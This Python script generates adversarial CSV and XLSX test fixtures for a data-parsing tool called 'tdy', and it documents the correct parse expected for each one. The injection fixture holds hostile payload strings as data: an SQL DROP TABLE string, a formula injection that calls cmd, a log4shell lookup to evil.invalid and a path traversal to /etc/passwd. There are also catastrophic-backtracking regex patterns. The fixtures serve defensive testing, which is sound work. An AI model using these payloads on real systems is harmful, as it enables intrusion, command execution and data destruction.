#!/usr/bin/env python3
"""Generate testdata/adversarial/* — degenerate and hostile inputs for `tdy`.

Run from the repo root:  python3 testdata/gen/08_adversarial.py
Deterministic, idempotent, stdlib + openpyxl only. Every file this script owns
is named `adversarial*` and lives in testdata/adversarial/.

These fixtures are NOT realistic. They exist to crash the tool, to make the
tier-1 sniffer contradict itself, or to make a wrong parse look like a right
one. Each entry below says what a *correct* parse must produce; where "correct"
means "a hard error", that is the assertion.

Constants used below (all verified with Python's proleptic-Gregorian calendar
and IEEE-754 doubles, see comments):
  Date32 = days since 1970-01-01.
  0000-01-01 = -719528   0000-02-29 = -719469   0000-12-31 = -719163
  0001-01-01 = -719162   1970-01-01 =       0   2000-02-29 =   11016
  2024-01-31 =    19753  2024-12-31 =    20088  9998-12-31 = 2932531
  9999-01-01 =  2932532  9999-12-30 = 2932895   9999-12-31 = 2932896

--------------------------------------------------------------------------
 1. adversarial_empty.csv                 0 bytes.
    Correct: `tdy sniff` fails with "no rows detected in <path>"; a
    hand-written spec fails in to_record_batch ("no column named `a`;
    available columns: []"). 0 rows, 0 columns, no panic, no sidecar written.

 2. adversarial_newlines_only.csv         50 x "\\n", nothing else.
    The csv crate drops empty records, so extraction yields 0 rows even
    though the file is 50 bytes. Correct: same error as (1).

 3. adversarial_bom_only.csv              exactly EF BB BF, nothing else.
    Non-empty on disk (3 bytes), empty after decoding (encoding_rs eats the
    BOM). Correct: same error as (1) — the byte count must not be mistaken
    for content.

 4. adversarial_delimiters_only.csv       ",,,,\\n" x 50.
    5 empty fields x 50 rows. No header (looks_like_header rejects a first
    row with blank cells). Correct tier-1 parse: 5 columns col_1..col_5, all
    Utf8, 50 rows, EVERY value NULL (the engine's empty-string -> null rule),
    confidence 0.95 - 0.10 (no header) - 0.15 (utf8 penalty) = 0.70, i.e.
    below the 0.8 escalation threshold.

 5. adversarial_wide_100k_cols.csv        ONE row, 100000 columns "1".."100000".
    Correct engine parse (hand-written spec, delimiter ',', ragged=error):
    100000 columns col_1..col_100000, all Int64, 1 row, col_1 = 1,
    col_100000 = 100000.
    Tier-1 gets this WRONG in a silent way: sample::build only decodes
    max_bytes*3/4 = 12288 bytes, which cuts the single line after "...,2679,"
    -> modal field count 2680 -> the sniffer emits col_1..col_2680 and the
    projection silently DROPS 97320 columns. Assertion worth writing:
    sniffed_spec.columns.len() == 100000 (currently 2680).

 6. adversarial_ragged_arity.csv          12 rows, row i has exactly i fields.
    Cell (i,j) = "rIIcJJ" zero-padded. Correct engine parse with
    ragged="pad_nulls" and no header: 12 columns col_1..col_12, all Utf8,
    12 rows; col_1 row 0 = "r01c01", col_12 row 11 = "r12c12", col_12 rows
    0..10 NULL. With ragged="error" the engine must fail with
    "ragged input: row 2 has 2 fields, expected 1".
    Tier-1 is NONDETERMINISTIC here: sniff::modal() takes the max over a
    std HashMap whose iteration order is randomized per process, and all
    twelve arities are tied at one occurrence each, so two runs of
    `tdy sniff` on this byte-identical file can emit different specs.
    Assertion: sniff twice, specs must be equal.

 7. adversarial_nan_infinity.csv          every cell is NaN / Infinity / -0.
    Correct tier-1 parse: 4 columns, 6 rows.
      nan_all  Utf8    (every value is an NA token -> all 6 NULL,
                        na_values = ["NaN"])
      inf_all  Float64 ("Infinity"/"inf"/"INFINITY" all parse as f64) ->
                        row 0 = +inf, row 2 = -inf. sum() over this column is
                        +inf, which is the point: an infinity is not an error.
      neg_zero Int64   ("-0" -> 0i64; i64 has no negative zero)
      mixed    Float64 na_values ["NaN","nan"]; values
                        [NULL, +inf, -0.0, NULL, -inf, NULL]; mixed[2] must be
                        -0.0 with the sign bit set (1.0/mixed[2] == -inf).

 8. adversarial_bignums.csv               i64 and decimal boundaries.
    2 columns (label Utf8, value), 8 rows in this order: i64_max, i64_min,
    i64_max_plus_1, twenty_nines, thirty_eight_nines, ten_pow_38, neg_zero,
    plus_one.
    Tier-1 types `value` as Float64 (its Int64 rule requires len < 19 and
    "9223372036854775807" is 19 chars) and therefore CORRUPTS it silently:
    value[0] == 9223372036854775808.0 (input was ...807), and
    value[4] == value[5] == 1e38 even though the two literals differ by one.
    Both are assertions against invariant 6.
    With dtype int64 the engine must instead fail at
    "row 3: cannot parse \\"9223372036854775808\\": number too large to fit in
    target type", and value[0] must be exactly 9223372036854775807.
    With dtype decimal(38,0): row 5 = 10^38-1 exactly, row 6 must fail with
    "value exceeds decimal(38, 0)".

 9. adversarial_dates.csv                 calendar edges, 5 columns, 4 rows.
    iso_ok      Date "%Y-%m-%d" -> [19753, 0, 11016, 20088]
    iso_min     Date "%Y-%m-%d" -> [-719528, -719527, -719469, -719163]
                (year 0 exists in the proleptic Gregorian calendar chrono
                 uses, and IS a leap year: 0000-02-29 is valid)
    iso_max     Date "%Y-%m-%d" -> [2932896, 2932895, 2932532, 2932531]
    iso_invalid Utf8 — 2024-02-30, 2023-02-29, 2024-13-01, 0000-00-00 are all
                unparseable, so tier-1 must NOT claim a date type; the values
                survive verbatim as strings ("2024-02-30" etc.).
                Forcing dtype date on this column must fail on row 1 with
                "date does not match format \\"%Y-%m-%d\\"".
    de_leap     Utf8 — 29.02.2024 (valid), 29.02.2023 (invalid), 31.04.2024
                (invalid), 01.01.1970 (valid). Mixed validity must not be
                typed as a date. Forcing "%d.%m.%Y" must fail on row 2.

10. adversarial_regex_bomb.csv            patterns and payloads that kill
    backtracking engines. 3 columns (pattern, payload, note) Utf8, 5 rows.
    row 0 pattern == "(a+)+$", payload == "a"*500 + "!" (len 501);
    row 4 pattern == "(a)\\1" — invalid in the `regex` crate (no
    backreferences), so ParseSpec::validate must reject a spec that copies it
    into `strip`, with "`strip` is not a valid regex".
    Correct behaviour: parsing is linear-time; using row 0's pattern as
    `strip` or in drop_rows_matching over the payload column completes
    instantly (Rust's regex has no backtracking) — a fixture against a future
    switch to a backtracking engine.

11. adversarial_injection.csv             hostile cell content, quoted with
    QUOTE_ALL. 3 columns (id Int64, payload Utf8, description Utf8), 8 rows.
    id = 1..8. payload row 0 == "'; DROP TABLE users; --" (must appear as a
    literal value, never reach SQL), row 2 is 10000 spaces on disk but MUST
    parse to NULL because build_column trims before the NA test, row 6
    contains an embedded newline inside one quoted field, so the file has 10
    physical lines but exactly 9 CSV records (1 header + 8 data rows).

12. adversarial_unterminated_quote.csv    a quote that never closes.
    5 physical lines: header a,b then "1,2", then a line starting with a lone
    double quote, then two more well-formed lines. The csv crate swallows
    everything after the open quote into one field, so 3 data lines silently
    collapse into 1 cell. Correct parse (tier 1, ragged becomes pad_nulls):
    2 columns (a Utf8, b Int64), 2 rows; a[0] == "1", b[0] == 2,
    b[1] IS NULL, and a[1].trim_end() == "unclosed,3\\n4,5\\n6,7".
    This is the fixture for "a wrong parse must be an error, not wrong data":
    losing two rows into a cell is exactly what invariant 6 forbids.

13. adversarial_nul_byte.csv              a NUL byte inside a header cell.
    Header is  id,na<NUL>me,val . git will treat this file as binary.
    Correct parse: 3 columns, 2 rows. The second column's output name is
    "na_me" (sniff::sanitize maps the control byte to "_") while its `source`
    is the raw "na\\u0000me" — which must round-trip through the TOML sidecar
    as an escaped \\u0000. id Int64 [1,2], na_me Utf8 ["alpha","beta"],
    val Int64 [10,20].

14. "adversarial_file with spaces.csv"    spaces in the filename.
15. "adversarial_it's_quoted.csv"         a single quote in the filename —
    the SQL literal must be written messy('...it''s_quoted.csv') and
    sqlscan::find_messy_refs must recover the real name.
16. 'adversarial_double"quote.csv'        a double quote in the filename.
    All three hold the same trivial body: 2 columns (k Int64, v Utf8),
    2 rows, k = [1,2], v = ["alpha","beta"]. The fixture is the path, not the
    content; a correct implementation also writes the sidecar next to it as
    <name>.tdy.toml with the quote/space preserved.
    Not attempted (representable on ext4, but poisonous for git, shells and
    CI): a newline inside a filename, and a filename containing a NUL byte
    (impossible on any POSIX filesystem).

17. adversarial_empty_sheet.xlsx          one sheet named "Empty", zero cells.
    Correct: `tdy sniff` fails with "sheet appears to be empty" (or, if
    calamine reports a 1x1 blank range, a 1-row all-NULL table). Either way:
    a clear error or a null, never a panic and never a bogus header.

18. adversarial_sparse_50k.xlsx           sheet "Sparse": A1 = "value",
    A50000 = 42, everything between empty.
    Correct engine parse (promote_header rows=1): 1 column, 49999 rows,
    rows 0..49997 NULL, row 49998 = 42.
    Tier-1 mis-types it: sniff probes only the first 400 rows, sees nothing
    but blanks, and emits dtype utf8 — so the engine yields the string "42",
    not the integer 42. Assertion: sniffed dtype for `value` should be Int64.
"""

import csv
import io
import random
import sys
import re
import zipfile
from datetime import datetime
from pathlib import Path

from openpyxl import Workbook

random.seed(20260828)  # nothing here is random; seeded so it stays that way.

# Frozen so the .xlsx files are byte-identical on every run (openpyxl
# otherwise stamps "now" into docProps/core.xml and into every zip entry).
FIXED_TIME = datetime(2026, 1, 1, 0, 0, 0)

TESTDATA = Path(__file__).resolve().parents[1]
OUT = TESTDATA / "adversarial"
REPO = TESTDATA.parent
PREFIX = "adversarial"

_written = []


def write_bytes(name, data):
    """Write one owned fixture. Returns the path, or None if the FS refused."""
    assert name.startswith(PREFIX), name
    path = OUT / name
    try:
        with open(path, "wb") as fh:
            fh.write(data)
    except OSError as exc:  # e.g. a filesystem that rejects the character
        print(f"SKIPPED {name}: {exc}", file=sys.stderr)
        return None
    _written.append(path)
    print(f"wrote {path.relative_to(REPO)} ({len(data)} bytes)")
    return path


def write_text(name, text):
    return write_bytes(name, text.encode("utf-8"))


MODIFIED_RE = re.compile(rb"(<dcterms:modified[^>]*>)[^<]*(</dcterms:modified>)")


def save_workbook(wb, name):
    """Save an .xlsx reproducibly: fixed doc properties, fixed zip stamps.

    Pinning `wb.properties.modified` is not enough on its own — openpyxl
    rewrites dcterms:modified from the wall clock at save time — so the XML
    is patched here too. Without it these files churn on every regeneration
    and stale every committed sidecar's blake3 fingerprint.
    """
    wb.properties.created = FIXED_TIME
    wb.properties.modified = FIXED_TIME
    buf = io.BytesIO()
    wb.save(buf)
    src = zipfile.ZipFile(io.BytesIO(buf.getvalue()))
    out = io.BytesIO()
    stamp = FIXED_TIME.strftime("%Y-%m-%dT%H:%M:%SZ").encode()
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as dst:
        for info in src.infolist():
            zi = zipfile.ZipInfo(info.filename, date_time=FIXED_TIME.timetuple()[:6])
            zi.compress_type = zipfile.ZIP_DEFLATED
            zi.external_attr = info.external_attr
            data = src.read(info.filename)
            if info.filename == "docProps/core.xml":
                data = MODIFIED_RE.sub(rb"\g<1>" + stamp + rb"\g<2>", data)
            dst.writestr(zi, data)
    return write_bytes(name, out.getvalue())


def csv_text(rows, quoting=csv.QUOTE_MINIMAL):
    buf = io.StringIO()
    w = csv.writer(buf, lineterminator="\n", quoting=quoting)
    w.writerows(rows)
    return buf.getvalue()


def main():
    OUT.mkdir(parents=True, exist_ok=True)

    # ---- 1. zero bytes -------------------------------------------------
    write_bytes(f"{PREFIX}_empty.csv", b"")

    # ---- 2. only newlines ----------------------------------------------
    write_bytes(f"{PREFIX}_newlines_only.csv", b"\n" * 50)

    # ---- 3. only a UTF-8 BOM -------------------------------------------
    write_bytes(f"{PREFIX}_bom_only.csv", b"\xef\xbb\xbf")

    # ---- 4. only delimiters --------------------------------------------
    write_bytes(f"{PREFIX}_delimiters_only.csv", b",,,,\n" * 50)

    # ---- 5. one row, 100k columns --------------------------------------
    wide = ",".join(str(i) for i in range(1, 100_001)) + "\n"
    write_text(f"{PREFIX}_wide_100k_cols.csv", wide)

    # ---- 6. every row a different arity --------------------------------
    ragged = [[f"r{i:02d}c{j:02d}" for j in range(1, i + 1)] for i in range(1, 13)]
    write_text(f"{PREFIX}_ragged_arity.csv", csv_text(ragged))

    # ---- 7. NaN / Infinity / -0 ----------------------------------------
    nan_rows = [
        ["nan_all", "inf_all", "neg_zero", "mixed"],
        ["NaN", "Infinity", "-0", "NaN"],
        ["NaN", "Infinity", "-0", "Infinity"],
        ["NaN", "-Infinity", "-0", "-0"],
        ["NaN", "inf", "-0", "nan"],
        ["NaN", "Infinity", "-0", "-Infinity"],
        ["NaN", "INFINITY", "-0", "NaN"],
    ]
    write_text(f"{PREFIX}_nan_infinity.csv", csv_text(nan_rows))

    # ---- 8. i64 / decimal boundaries -----------------------------------
    big_rows = [
        ["label", "value"],
        ["i64_max", "9223372036854775807"],
        ["i64_min", "-9223372036854775808"],
        ["i64_max_plus_1", "9223372036854775808"],
        ["twenty_nines", "9" * 20],
        ["thirty_eight_nines", "9" * 38],
        ["ten_pow_38", "1" + "0" * 38],
        ["neg_zero", "-0"],
        ["plus_one", "+1"],
    ]
    write_text(f"{PREFIX}_bignums.csv", csv_text(big_rows))

    # ---- 9. calendar edges ---------------------------------------------
    date_rows = [
        ["iso_ok", "iso_min", "iso_max", "iso_invalid", "de_leap"],
        ["2024-01-31", "0000-01-01", "9999-12-31", "2024-02-30", "29.02.2024"],
        ["1970-01-01", "0000-01-02", "9999-12-30", "2023-02-29", "29.02.2023"],
        ["2000-02-29", "0000-02-29", "9999-01-01", "2024-13-01", "31.04.2024"],
        ["2024-12-31", "0000-12-31", "9998-12-31", "0000-00-00", "01.01.1970"],
    ]
    write_text(f"{PREFIX}_dates.csv", csv_text(date_rows))

    # ---- 10. regex bombs -----------------------------------------------
    bomb_rows = [
        ["pattern", "payload", "note"],
        ["(a+)+$", "a" * 500 + "!", "classic catastrophic backtracking"],
        ["^(a|a)*$", "a" * 300 + "b", "alternation blowup"],
        ["(x+x+)+y", "x" * 200 + "z", "nested quantifiers"],
        [".*.*.*.*=.*", "x" * 100, "no equals sign; backtracker never finishes"],
        [r"(a)\1", "aa", "backreference: rejected by the regex crate"],
    ]
    write_text(f"{PREFIX}_regex_bomb.csv", csv_text(bomb_rows))

    # ---- 11. injection strings and 10k spaces --------------------------
    inj_rows = [
        ["id", "payload", "description"],
        ["1", "'; DROP TABLE users; --", "sql injection, single quote"],
        ["2", '"); DROP TABLE t; --', "sql injection, double quote"],
        ["3", " " * 10_000, "ten thousand spaces"],
        ["4", "=cmd|' /C calc'!A0", "csv formula injection"],
        ["5", "${jndi:ldap://evil.invalid/x}", "log4shell string"],
        ["6", "../../../etc/passwd", "path traversal"],
        ["7", "line1\nline2", "embedded newline inside one field"],
        ["8", "He said \"hi\" and 'bye'", "mixed quotes"],
    ]
    write_text(f"{PREFIX}_injection.csv", csv_text(inj_rows, quoting=csv.QUOTE_ALL))

    # ---- 12. unterminated quote ----------------------------------------
    write_text(
        f"{PREFIX}_unterminated_quote.csv",
        'a,b\n1,2\n"unclosed,3\n4,5\n6,7\n',
    )

    # ---- 13. NUL byte in a header cell ---------------------------------
    write_bytes(
        f"{PREFIX}_nul_byte.csv",
        b"id,na\x00me,val\n1,alpha,10\n2,beta,20\n",
    )

    # ---- 14-16. hostile filenames --------------------------------------
    body = csv_text([["k", "v"], ["1", "alpha"], ["2", "beta"]])
    write_text(f"{PREFIX}_file with spaces.csv", body)
    write_text(f"{PREFIX}_it's_quoted.csv", body)
    write_text(f'{PREFIX}_double"quote.csv', body)

    # ---- 17. workbook whose only sheet is empty ------------------------
    wb = Workbook()
    wb.active.title = "Empty"
    save_workbook(wb, f"{PREFIX}_empty_sheet.xlsx")

    # ---- 18. sparse sheet: one value 50k rows down ---------------------
    wb = Workbook()
    ws = wb.active
    ws.title = "Sparse"
    ws["A1"] = "value"
    ws["A50000"] = 42
    save_workbook(wb, f"{PREFIX}_sparse_50k.xlsx")

    over = [q for q in _written if q.stat().st_size > 2 * 1024 * 1024]
    if over:
        print(f"WARNING: over the 2 MB budget: {over}", file=sys.stderr)


if __name__ == "__main__":
    main()
